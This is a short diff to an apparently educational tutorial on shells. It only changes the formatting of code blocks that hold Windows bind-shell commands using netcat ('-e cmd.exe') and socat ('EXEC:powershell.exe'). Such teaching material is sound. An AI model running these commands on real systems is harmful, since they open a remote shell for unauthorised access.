@@ -115,8 +115,8 @@ Notice that after running the command on the right, the listener receives a conn
 ### Bind Shell example
 
 The bind shell is less common, but still very useful. On the target, we will need to start a listener, and at the same time tell it to execute `cmd.exe`:
-```console
-~$ nc -lvnp <PORT> -e "cmd.exe"
+```powershell
+> nc -lvnp <PORT> -e "cmd.exe"
 ```
 On the attacking machine, we will execute something like
 ```console
@@ -291,8 +291,8 @@ For **bind shells**, we would start a listener on a Linux target by using:
 ```
 
 Similarly, on a Windows target:
-```console
-~$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+```powershell
+> socat TCP-L:<PORT> EXEC:powershell.exe,pipes
 ```
 
 Again, the `pipes` option is used to interface between the standard input and outputs of Windows and UNIX.
